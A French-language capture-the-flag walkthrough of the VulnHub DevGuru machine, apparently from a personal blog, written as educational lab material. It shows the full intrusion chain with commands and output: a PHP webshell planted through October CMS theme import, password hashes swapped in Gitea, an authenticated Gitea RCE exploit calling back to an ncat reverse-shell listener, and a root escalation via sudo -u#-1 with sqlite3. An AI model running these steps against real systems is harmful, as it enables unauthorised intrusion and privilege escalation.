# Solution du CTF DevGuru de VulnHub

Dirty Little Secret
-------------------

[DevGuru](https://www.vulnhub.com/entry/devguru-1,620/), CTF écrit par [Zayotic](https://twitter.com/Zayotic) était original dans le sens où il nous faisait prendre des actions qui changent du classique dump puis cassage de hash.  

J'ai suivit mon intuition tout au long de ce CTF mais je me suis parfois demandé si je n'était pas sur une piste inattendue. La lecture d'autres writeup après la résolution du CTF m'a montré qu'il s'agissait bien du bon chemin même si mes actions ont parfois légèrement divergé.  

```plain
$  sudo nmap -sCV -p- -T5 192.168.56.20 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.20 
Host is up (0.00016s latency). 
Not shown: 65532 closed tcp ports (reset) 
PORT     STATE SERVICE VERSION 
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA) 
|   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA) 
|_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519) 
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu)) 
|_http-generator: DevGuru 
| http-git:  
|   192.168.56.20:80/.git/ 
|     Git repository found! 
|     Repository description: Unnamed repository; edit this file 'description' to name the... 
|     Last commit message: first commit  
|     Remotes: 
|       http://devguru.local:8585/frank/devguru-website.git 
|_    Project type: PHP application (guessed from .gitignore) 
|_http-title: Corp - DevGuru 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
8585/tcp open  unknown 
| fingerprint-strings:  
|   GenericLines:  
|     HTTP/1.1 400 Bad Request 
|     Content-Type: text/plain; charset=utf-8 
|     Connection: close 
|     Request 
|   GetRequest:  
|     HTTP/1.0 200 OK 
|     Content-Type: text/html; charset=UTF-8 
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 
|     Set-Cookie: i_like_gitea=220554e66d449ff2; Path=/; HttpOnly 
|     Set-Cookie: _csrf=e-VEbsEbKLa1JaL3MAcVZUF0R7o6MTY0Mzc1MjcwNzI2OTQzMjE0NQ; Path=/; Expires=Wed, 02 Feb 2022 21:58:27 GMT; HttpOnly 
|     X-Frame-Options: SAMEORIGIN 
|     Date: Tue, 01 Feb 2022 21:58:27 GMT 
|     <!DOCTYPE html> 
|     <html lang="en-US" class="theme-"> 
|     <head data-suburl=""> 
|     <meta charset="utf-8"> 
|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
|     <meta http-equiv="x-ua-compatible" content="ie=edge"> 
|     <title> Gitea: Git with a cup of tea </title> 
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials"> 
|     <meta name="theme-color" content="#6cc644"> 
|     <meta name="author" content="Gitea - Git with a cup of tea" /> 
|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless 
|   HTTPOptions:  
|     HTTP/1.0 404 Not Found 
|     Content-Type: text/html; charset=UTF-8 
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 
|     Set-Cookie: i_like_gitea=8b447560b6cfa934; Path=/; HttpOnly 
|     Set-Cookie: _csrf=-HTJdpG14UGiRCe-AziOyn34j0s6MTY0Mzc1MjcwNzI4NDU3ODE5NQ; Path=/; Expires=Wed, 02 Feb 2022 21:58:27 GMT; HttpOnly 
|     X-Frame-Options: SAMEORIGIN 
|     Date: Tue, 01 Feb 2022 21:58:27 GMT 
|     <!DOCTYPE html> 
|     <html lang="en-US" class="theme-"> 
|     <head data-suburl=""> 
|     <meta charset="utf-8"> 
|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
|     <meta http-equiv="x-ua-compatible" content="ie=edge"> 
|     <title>Page Not Found - Gitea: Git with a cup of tea </title> 
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials"> 
|     <meta name="theme-color" content="#6cc644"> 
|     <meta name="author" content="Gitea - Git with a cup of tea" /> 
|_    <meta name="description" content="Gitea (Git with a c
```

J'avoue que je n'ai même pas cherché à étudier la piste du *Gitea* (sur le por 8585) quand j'ai remarqué la présence du dossier *.git* sur le port 80.  

J'ai pour le coup sauté sur [git-dumper](https://github.com/arthaud/git-dumper), j'ai utilisé un autre soft du même type par le passé mais celui ci est de bonne qualité.  

```plain
$ python git-dumper.py http://192.168.56.20/.git/ website
```

Cet utilitaire télécharge récursivement les fichiers dans le dossier *.git*, extrait les références aux fichiers à l'intérieur et recréé localement le repository. Le dossier de destination mentionné sur la ligne de commande doit être pré-existant.  

Ce répo ne dispose que d'un seul commit :  

```plain
$ git log
commit 7de9115700c5656c670b34987c6fbffd39d90cf2 (HEAD -> master, origin/master) 
Author: frank <frank@devguru.local> 
Date:   Thu Nov 19 18:42:03 2020 -0600 

    first commit
```

Il y a 3 fichiers dans le répo qui semblent intéressants :  

* *adminer.php* est un équivalent minimaliste de phpMyAdmin, packé en un seul fichier (particulièrement pratique pour fouiner dans une base de données après un webshell récupéré).
* *README.md* nous permet de savoir que l'appli web utilisée sur le site est un [October CMS](https://github.com/octobercms/)
* *config/database.php* contient les identifiants de base de données ci après

```php
        'mysql' => [ 
            'driver'     => 'mysql', 
            'engine'     => 'InnoDB', 
            'host'       => 'localhost', 
            'port'       => 3306, 
            'database'   => 'octoberdb', 
            'username'   => 'october', 
            'password'   => 'SQ66EBYx4GT3byXH', 
            'charset'    => 'utf8mb4', 
            'collation'  => 'utf8mb4_unicode_ci', 
            'prefix'     => '', 
            'varcharmax' => 191, 
        ],
```

Avec ces identifiants on peut donc se connecter à *Adminer* et aller voir dans la table *backend\_users*.  

Ici se trouve un utilisateur *Franck Morris* qui a le hash bcrypt *$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK*.  

J'ai tenté sans succès de le casser avec *Penglab* (j'ai laissé tomber après un moment) et j'ai préféré créer un nouvel utilisateur, privilégié lui aussi :  

![DevGuru CTF October CMS account creation](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/devguru_octobercms_new_account.png)

J'ai eu recours au site [bcrypt-generator.com](https://bcrypt-generator.com/) pour obtenir un hash valide (qui correspond ici à *guest*).  

I did it myyyyyy wayyyyyy
-------------------------

Il fallait alors déterminer où se trouve la page de login sur le CMS. J'ai regardé le code de [cet exploit](https://www.exploit-db.com/exploits/47376) touchant l'application, vu que */backend* était mentionné et j'ai été redirigé directement sur la page de login quand j'ai tapé sur cette URL.  

L'accès obtenu sur le CMS permet de jouer sur la configuration. Les autres personnes ayant résolu le CTF se sont dirigés vers le mécanisme de *Markup* des pages qui disposait d'un onglet *Code* que je n'ai pas remarqué.
J'ai d'abord tenté d'uploader un fichier via la section des assets :  

```plain
Error uploading file 'shell.php5': Only the following file types are allowed: jpg, jpeg, bmp, png, webp, gif, ico, css, js, woff, woff2, ttf, eot, json, md, less, sass, scss, xml
```

Ensuite via la section des contenus :  

```plain
Invalid file extension: php5. Allowed extensions are: htm, txt, md.
```

Et finalement via les médias :  

```plain
The file type used is blocked for security reasons.
```

J'ai ensuite remarqué un mécanisme d'import / export sur les thèmes du CMS. Ma technique a été la suivante :  

1. Prendre un thème existant, cliquer sur *Manage* puis *Export*, télécharger l'archive ZIP générée
2. Dézipper l'archive, ajouter le shell PHP dans le dossier *assets* (à la racine de l'archive ce n'est pas pris en compte)
3. Recréer une archive zip : *zip -r new\_theme .*
4. Dans la page des thèmes, cliquer sur *Create a new blank theme* et saisir le dossier de destination du thème
5. Sur ce nouveau thème cliquer sur *Import* avec l'option *Overwrite existing files* et uploader l'archive

Et voilà, un beau shell avec l'utilisateur www-data : *http://192.168.56.20/themes/test/assets/shell.php?cmd=id*.  

So good I did it twice
----------------------

Une fois un shell interactif récupéré il n'y a rien qui me saute aux yeux. On peut toutefois lister les fichiers de l'utilisateur *frank* sur le système :  

```plain
$ find / -user frank -ls | grep -v /proc/
   656007      4 drwxr-xr-x   7 frank    frank        4096 Nov 19  2020 /var/lib/gitea
   662525      4 drwxr-xr-x   2 frank    frank        4096 Nov 19  2020 /var/lib/gitea/custom
   665045      4 drwxr-x---   2 frank    frank        4096 Nov 19  2020 /var/lib/gitea/log
   665017      4 drwxr-x---   3 frank    frank        4096 Nov 19  2020 /var/lib/gitea/indexers
   665000      4 drwxr-x---   7 frank    frank        4096 Nov 19  2020 /var/lib/gitea/data
   665040      4 drwxr-xr-x   2 frank    frank        4096 Nov 19  2020 /var/lib/gitea/public
   656501     56 -rw-r--r--   1 frank    frank       56688 Nov 19  2020 /var/backups/app.ini.bak
   919157 104928 -rwxrwxr-x   1 frank    frank    107443064 Nov 19  2020 /usr/local/bin/gitea
   408540      4 drwxr-x---   3 frank    frank         4096 Feb  1 15:57 /opt/gitea
   410236      4 drwxr-x---   7 frank    frank         4096 Nov 19  2020 /home/frank
   535852      4 drwxr-x---   2 frank    frank         4096 Nov 19  2020 /etc/gitea
```

Le fichier de backup semble une piste crédible :  

```plain
[database]
; Database to use. Either "mysql", "postgres", "mssql" or "sqlite3".
DB_TYPE             = mysql
HOST                = 127.0.0.1:3306
NAME                = gitea
USER                = gitea
; Use PASSWD = `your password` for quoting if you use special characters in the password.
PASSWD              = UfFPTF8C8jjxVF2m
```

Mais ce mot de passe ne permet pas d'accéder au compte *frank* via su, ni même celui du October...  

Retour sur *Adminer* donc pour étudier la base SQL *gitea*. Il y a un compte frank enregistré sur l'appli :  

```plain
INSERT INTO `user` (`id`, `lower_name`, --- snip ---
VALUES (1,     'frank',        'frank',        '',     'frank@devguru.local',  0,      'enabled',
'c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900', 'pbkdf2',0
--- snip ---
```

pbkdf2... oh je passe mon tour pour casser ça. Faut-il là encore insérer un nouveau hash ? *Gitea* supporte différents algorithmes de hashage. J'ai trouvé [un Yaml qui doit être lié à des tests unitaires](https://gitlab.snirsofer.com/snirs/gitea/src/3a1332c326a4700e54e7bd6a0ef2bd050a6910b2/models/fixtures/user.yml) et dedans on trouve des hashs qui correspondent au mot de passe *password*, j'ai donc changé l'algo dans l'enregistrement ainsi que le hash et victoire j'ai pu me connecter.  

Je met ici l'extrait du Yaml qui pourra aider si la référence est retirée d'Internet :  

```plain
 # NOTE: all users should have a password of "password"

- # NOTE: this user (id=1) is the admin
  id: 1
  lower_name: user1
  name: user1
  full_name: User One
  email: user1@example.com
  email_notifications_preference: enabled
  passwd_hash_algo: argon2
  passwd: a3d5fcd92bae586c2e3dbe72daea7a0d27833a8d0227aa1704f4bbd775c1f3b03535b76dd93b0d4d8d22a519dca47df1547b # password
  type: 0 # individual
  salt: ZogKvWdyEx
  is_admin: true
  avatar: avatar1
  avatar_email: user1@example.com
  num_repos: 0
  is_active: true
```

Sur l'interface du *Gitea* je vois en fin de page *Powered by Gitea Version: 1.12.5*.  

Cette version est vulnérable [à cet exploit](https://www.exploit-db.com/exploits/49571) de RCE authentifié. Le code créé un nouveau projet sur l'appli web et défini un hook qui permet l'exécution de commande.  

L'exploit n'a pas fonctionné au début car l'URL passée en paramètre ne veut pas de slash final ou plutôt le serveur n'aime pas qu'il y ait deux slashs :  

```plain
$ curl -I http://192.168.56.20:8585//user/login 
HTTP/1.1 404 Not Found 
Content-Type: text/html; charset=UTF-8 
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 
Set-Cookie: i_like_gitea=83a842f319f6a9f4; Path=/; HttpOnly 
Set-Cookie: _csrf=jMZRG2AwHoiI1gc7ADBh6KeYWvI6MTY0Mzc2NzM0MTY0ODQ0NjYyOQ; Path=/; Expires=Thu, 03 Feb 2022 02:02:21 GMT; HttpOnly 
X-Frame-Options: SAMEORIGIN 
Date: Wed, 02 Feb 2022 02:02:21 GMT 

$ curl -I http://192.168.56.20:8585/user/login  
HTTP/1.1 200 OK 
Content-Type: text/html; charset=UTF-8 
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 
Set-Cookie: i_like_gitea=38ed18ef922238f5; Path=/; HttpOnly 
Set-Cookie: _csrf=_u__uHywI4oRgaeOlIuS9bjFg3A6MTY0Mzc2NzM0NTA1OTczMjE1NA; Path=/; Expires=Thu, 03 Feb 2022 02:02:25 GMT; HttpOnly 
X-Frame-Options: SAMEORIGIN 
Date: Wed, 02 Feb 2022 02:02:25 GMT
```

J'ai remarqué cela avec Wireshark mais qu'importe une fois que l'on connait le truc :  

```plain
$ python gitea.py -v -t http://192.168.56.20:8585 -u frank -p password -I 192.168.56.1 -P 9999  
    _____ _ _______ 
   / ____(_)__   __|             CVE-2020-14144 
  | |  __ _   | | ___  __ _ 
  | | |_ | |  | |/ _ \/ _` |     Authenticated Remote Code Execution 
  | |__| | |  | |  __/ (_| | 
   \_____|_|  |_|\___|\__,_|     GiTea versions >= 1.1.0 to <= 1.12.5 

[+] Starting exploit ... 
   [>] login('frank', ...) 
   [>] Deleting repository : vuln 
   [>] Creating repository : vuln 
   [>] repo_set_githook_post_receive('vuln') 
   [>] logout() 
astuce: Utilisation de 'master' comme nom de la branche initiale. Le nom de la branche 
astuce: par défaut peut changer. Pour configurer le nom de la branche initiale 
astuce: pour tous les nouveaux dépôts, et supprimer cet avertissement, lancez : 
astuce:  
astuce:         git config --global init.defaultBranch <nom> 
astuce:  
astuce: Les noms les plus utilisés à la place de 'master' sont 'main', 'trunk' et 
astuce: 'development'. La branche nouvellement créée peut être rénommée avec : 
astuce:  
astuce:         git branch -m <nom> 
Dépôt Git vide initialisé dans /tmp/tmp.CxYwtR6dPD/.git/ 
[master (commit racine) aee96fb] Initial commit 
 1 file changed, 1 insertion(+) 
 create mode 100644 README.md 
Traceback (most recent call last): 
  File "gitea.py", line 241, in <module> 
    trigger_exploit(g.host, g.username, g.password, reponame, verbose=args.verbose) 
  File "gitea.py", line 180, in trigger_exploit 
    conn.expect("Username for .*: ") 
  File "/home/sirius/.local/share/virtualenvs/code-4-BMv2Qy/lib/python3.8/site-packages/pexpect/spawnbase.py", line 343, in expect 
    return self.expect_list(compiled_pattern_list, 
  File "/home/sirius/.local/share/virtualenvs/code-4-BMv2Qy/lib/python3.8/site-packages/pexpect/spawnbase.py", line 372, in expect_list 
    return exp.expect_loop(timeout) 
  File "/home/sirius/.local/share/virtualenvs/code-4-BMv2Qy/lib/python3.8/site-packages/pexpect/expect.py", line 179, in expect_loop 
    return self.eof(e) 
  File "/home/sirius/.local/share/virtualenvs/code-4-BMv2Qy/lib/python3.8/site-packages/pexpect/expect.py", line 122, in eof 
    raise exc 
pexpect.exceptions.EOF: End Of File (EOF). Exception style platform. 
<pexpect.pty_spawn.spawn object at 0x7f61d629dbe0> 
command: /bin/bash 
args: ['/bin/bash', '-c', 'cd /tmp/tmp.CxYwtR6dPD && git push -u origin master'] 
buffer (last 100 chars): b'' 
before (last 100 chars): b"er\r\nLa branche 'master' est param\xc3\xa9tr\xc3\xa9e pour suivre la branche distante 'master' depuis 'origin'.\r\n" 
after: <class 'pexpect.exceptions.EOF'> 
match: None 
match_index: None 
exitstatus: None 
flag_eof: True 
pid: 21806 
child_fd: 6 
closed: False 
timeout: 30 
delimiter: <class 'pexpect.exceptions.EOF'> 
logfile: None 
logfile_read: None 
logfile_send: None 
maxread: 2000 
ignorecase: False 
searchwindowsize: None 
delaybeforesend: 0.05 
delayafterclose: 0.1 
delayafterterminate: 0.1 
searcher: searcher_re: 
    0: re.compile(b'Username for .*: ')
```

et sur le Ncat préalablement mis en écoute :  

```plain
$ ncat -v -l -p 9999 
Ncat: Version 7.92 ( https://nmap.org/ncat ) 
Ncat: Listening on :::9999 
Ncat: Listening on 0.0.0.0:9999 
Ncat: Connection from 192.168.56.20. 
Ncat: Connection from 192.168.56.20:34700. 
bash: cannot set terminal process group (617): Inappropriate ioctl for device 
bash: no job control in this shell 
frank@devguru:~/gitea-repositories/frank/vuln.git$ id 
id 
uid=1000(frank) gid=1000(frank) groups=1000(frank)
```

Je m’empresse de rajouter ma clé publique SSH au fichier *.ssh/authorized keys* pour utiliser le serveur SSH à la place du Ncat.  

unsigned int
------------

```plain
frank@devguru:~$ cat user.txt  
22854d0aec6ba776f9d35bf7b0e00217
frank@devguru:~$ sudo -l 
Matching Defaults entries for frank on devguru: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User frank may run the following commands on devguru: 
    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
```

Je peux lancer sqlite3 en tant que n'importe quel utilisateur... sauf root !  

sqlite3 dispose d'une commande *.system* pour exécuter des commandes mais si je ne peux pas taper sur root, quel est ma cible ?  

J'ai noté des dossiers sous */data* liés à un utilisateur manquant. J'ai donc fouillé dans ce sens :  

```plain
frank@devguru:~$ ls -ld /data/backups/ 
drwx------ 2 998 root 4096 Nov 18  2020 /data/backups/

frank@devguru:~$ sudo -u \#998 /usr/bin/sqlite3 
SQLite version 3.22.0 2018-01-22 18:45:57 
Enter ".help" for usage hints. 
Connected to a transient in-memory database. 
Use ".open FILENAME" to reopen on a persistent database. 
sqlite> .system ls /data/backups -al 
total 8 
drwx------  2  998 root 4096 Nov 18  2020 . 
drwxr-xr-x 20 root root 4096 Nov 18  2020 ..
```

Il y avait d'autres dossiers mais rien d'intéressant. J'ai ensuite regardé l'utilisateur *syslog* car il dispose de droits sur */var/log/auth.log*. J'ai juste trouvé ceci :  

```plain
Nov 19 02:27:34 corp sudo:    frank : TTY=pts/0 ; PWD=/root ; USER=root ;
    COMMAND=/usr/local/bin/gitea admin create-user --username frank --password 52QCem2uwtGLHEVQ --email frank@corp.local -c /etc/gitea/app.ini
```

Heureusement je me rappelais vaguement d'une faille pour sudo ou sudoedit [où l'on passait un ID d'utilisateur amusant](https://www.exploit-db.com/exploits/47502).  

En regardant la description de l'exploit on comprends qu'il s'agit exactement de cette situation, c'est donc la solution attendue :  

```plain
frank@devguru:~$ sudo -u \#-1 /usr/bin/sqlite3   
SQLite version 3.22.0 2018-01-22 18:45:57 
Enter ".help" for usage hints. 
Connected to a transient in-memory database. 
Use ".open FILENAME" to reopen on a persistent database. 
sqlite> .system /bin/bash 
root@devguru:~# id 
uid=0(root) gid=1000(frank) groups=1000(frank) 
root@devguru:~# cd /root 
root@devguru:/root# ls 
msg.txt  root.txt 
root@devguru:/root# cat root.txt 
96440606fb88aa7497cde5a8e68daf8f 
root@devguru:/root# cat msg.txt 

           Congrats on rooting DevGuru! 
  Contact me via Twitter @zayotic to give feedback!
```

Vous pouvez aussi lire [cet article](https://www.hackingarticles.in/devguru-1-vulnhub-walkthrough/) pour une résolution un peu différente (Markup October + Hooks Gitea à la main)  


*Published February 02 2022 at 18:03*